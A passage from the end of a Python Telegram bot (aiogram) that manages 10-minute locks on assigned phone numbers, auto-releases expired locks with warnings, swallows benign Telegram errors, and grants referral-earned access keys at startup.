            InlineKeyboardButton(text=f"✅ {_disp(r['number'])}",
                                 callback_data=f"ai_hot_approve_{r['num_id']}"),
            InlineKeyboardButton(text="❌ Reject",
                                 callback_data=f"ai_hot_reject_{r['num_id']}"),
        ])

    btns.append([InlineKeyboardButton(text="🔙 Admin", callback_data="back_admin")])
    await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# AUTO-RELEASE LOCKED NUMBERS (10-MIN EXPIRY)
# ══════════════════════════════════════════════════════════════

# Tracks numbers that have received a "expiring soon" notification
# num_id -> timestamp when warning was sent
_release_warned: dict[int, int] = {}


@router.callback_query(F.data.startswith("keep_lock_"))
async def cb_keep_lock(call: CallbackQuery):
    nid = int(call.data.split("_")[2])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num or num["assigned_to"] != uid:
        await call.answer("⛔ This number isn't assigned to you.", show_alert=True)
        return
    # Refresh assigned_at so the 10-min clock resets
    with db.cx() as c:
        c.execute("UPDATE numbers SET assigned_at=? WHERE id=?",
                  (int(datetime.now().timestamp()), nid))
    _release_warned.pop(nid, None)
    await call.answer("🔒 Lock renewed for another 10 minutes.", show_alert=True)
    try:
        await call.message.edit_text(
            f"🔒 <b>Lock renewed</b>\n\n"
            f"<code>{_disp(num['number'])}</code> is locked to you for another 10 minutes.",
            reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("release_now_"))
async def cb_release_now(call: CallbackQuery):
    nid = int(call.data.split("_")[2])
    uid = call.from_user.id
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num or num["assigned_to"] != uid:
        await call.answer("Already released.", show_alert=True)
        return
    with db.cx() as c:
        c.execute("UPDATE numbers SET assigned_to=NULL, assigned_at=NULL WHERE id=?", (nid,))
    _release_warned.pop(nid, None)
    active_sessions.pop(uid, None)
    await call.answer("🔓 Number released.", show_alert=True)
    try:
        await call.message.edit_text(
            f"🔓 <b>Released</b>\n\n<code>{_disp(num['number'])}</code> is now free.",
            reply_markup=None)
    except Exception:
        pass


async def auto_release_locked():
    """Every 60 s: warn users whose lock is 8+ min old; release at 10+ min with no renewal."""
    WARN_AT  = 8 * 60   # send warning at 8 min
    KILL_AT  = 10 * 60  # force-release at 10 min
    await asyncio.sleep(30)   # startup delay
    while True:
        try:
            now_ts = int(datetime.now().timestamp())
            locked = db.cx().execute(
                "SELECT id, number, assigned_to, assigned_at FROM numbers "
                "WHERE assigned_to IS NOT NULL AND assigned_at IS NOT NULL"
            ).fetchall()
            for n in locked:
                age = now_ts - (n["assigned_at"] or now_ts)
                nid = n["id"]
                uid = n["assigned_to"]

                if age >= KILL_AT:
                    # Force-release
                    with db.cx() as c:
                        c.execute("UPDATE numbers SET assigned_to=NULL, assigned_at=NULL WHERE id=?",
                                  (nid,))
                    _release_warned.pop(nid, None)
                    active_sessions.pop(uid, None)
                    try:
                        await bot.send_message(
                            uid,
                            f"🔓 <b>Lock expired</b>\n\n"
                            f"<code>{_disp(n['number'])}</code> was automatically released "
                            f"after 10 minutes of inactivity.",
                            parse_mode="HTML")
                    except Exception:
                        pass

                elif age >= WARN_AT and nid not in _release_warned:
                    # Send warning once
                    _release_warned[nid] = now_ts
                    remaining = KILL_AT - age
                    try:
                        await bot.send_message(
                            uid,
                            f"⏳ <b>Lock expiring soon</b>\n\n"
                            f"<code>{_disp(n['number'])}</code> will be automatically released "
                            f"in ~{remaining // 60} minute(s).\n\n"
                            f"Tap below to keep it locked or release it now.",
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                                InlineKeyboardButton(text="🔒 Keep Lock",
                                                     callback_data=f"keep_lock_{nid}"),
                                InlineKeyboardButton(text="🔓 Release",
                                                     callback_data=f"release_now_{nid}"),
                            ]]))
                    except Exception:
                        pass

        except Exception:
            pass
        await asyncio.sleep(60)


# ══════════════════════════════════════════════════════════════
# CORE
# ══════════════════════════════════════════════════════════════

dp.include_router(router)


@dp.errors()
async def _global_error_handler(event: ErrorEvent):
    """Silently swallow harmless Telegram errors; log the rest."""
    exception = event.exception
    err_str   = str(exception).lower()
    # These are normal race-conditions — no need to pollute logs
    if isinstance(exception, TelegramBadRequest) and any(x in err_str for x in (
        "message is not modified",
        "query is too old",
        "message to edit not found",
        "bot was blocked",
    )):
        return True   # handled — suppress
    log.warning("[ErrorHandler] Unhandled exception: %s", exception)
    return False


async def _auto_grant_pending_keys():
    """
    Runs once on bot startup.
    Finds every user whose refer_count meets the threshold but who never got
    a key (access_key IS NULL, is_unlocked=0). Grants keys and unlocks them
    automatically so no one is stuck from pre-fix bugs.
    """
    await asyncio.sleep(3)   # let the bot finish connecting first
    try:
        limit = int(db.get("refer_limit") or 1)
        rkt   = db.get("refer_key_type") or "perm"
        dur   = int(db.get("refer_key_duration") or 1440) if rkt == "temp" else None
        is_lt = 1 if rkt == "perm" else 0
        # Users who have >= limit referrals but no key yet
        candidates = db.cx().execute(
            "SELECT * FROM users WHERE refer_count >= ? "
            "AND access_key IS NULL AND is_unlocked=0 AND is_banned=0",
            (limit,)
        ).fetchall()
        count = 0
        for u in candidates:
            uid = u["user_id"]
            nk  = gen_key()
            now_str = _now_ist().strftime("%d-%m-%Y %H:%M")
            try:
                conn = db.cx()
                if rkt == "temp" and dur:
                    expiry_dt  = _now_ist() + timedelta(minutes=dur)
                    expiry_str = expiry_dt.strftime("%d-%m-%Y %H:%M:%S")
                    conn.execute(
                        "UPDATE users SET access_key=?, is_unlocked=1, "
                        "key_expiry_at=?, key_expired_at=NULL WHERE user_id=?",
                        (nk, expiry_str, uid))
                else:
                    conn.execute(
                        "UPDATE users SET access_key=?, is_unlocked=1, "
                        "key_expiry_at=NULL, key_expired_at=NULL WHERE user_id=?",
                        (nk, uid))
                conn.execute(
                    "INSERT OR IGNORE INTO access_keys"
                    "(key,owner_id,created_at,used_by,is_lifetime,revoked,expiry_minutes,source)"
                    " VALUES(?,?,?,NULL,?,0,?,'refer_auto')",
                    (nk, uid, now_str, is_lt, dur))
                conn.commit()
                conn.close()
                count += 1
                _DUR_LABELS = {1:"1 min",120:"2h",1440:"24h",10080:"7d",43200:"30d",86400:"60d"}
                key_note = (f"⏱ Temporary — valid for <b>{_DUR_LABELS.get(dur, str(dur)+'m')}</b>."
                            if rkt == "temp" and dur else "♾ Permanent — never expires.")
                try:
                    await bot.send_message(
                        uid,
                        "╔══════════════════════╗\n"
                        "  🎉 <b>ACCESS GRANTED!</b>\n"
                        "╚══════════════════════╝\n\n"
                        "Your referral was completed — you've been automatically unlocked!\n\n"
                        f"🔑 Your Key:\n<code>{nk}</code>\n\n"
                        f"{key_note}\n\n"
                        "Tap /start to begin.")
                except Exception:
                    pass
            except Exception as e:
                log.error("auto_grant_pending_keys: failed for user %s: %s", uid, e)

        if count:
            log.info("auto_grant_pending_keys: granted keys to %d users on startup", count)
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"🚀 <b>Auto-grant on startup:</b> gave keys to <b>{count}</b> "
                        f"user(s) who completed referrals but were stuck without a key.")
                except Exception:
                    pass
    except Exception as e:
        log.error("auto_grant_pending_keys crashed: %s", e, exc_info=True)


async def main():
    # GUARD FIX: install guard BEFORE dp.start_polling so the web_app_data
    # handler gets registered into the dispatcher in time.
    # In aiogram 3.x, routers included after start_polling() are silently ignored.
    guard.install(db, dp)
    asyncio.create_task(auto_resync())
    asyncio.create_task(auto_quarantine_recovery())
    asyncio.create_task(auto_status_monitor())
    asyncio.create_task(auto_hot_score())
    asyncio.create_task(auto_release_locked())
    asyncio.create_task(auto_tier_demotion())   # hourly tier promotion/demotion
    asyncio.create_task(_auto_grant_pending_keys())   # grant keys to stuck users on startup
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
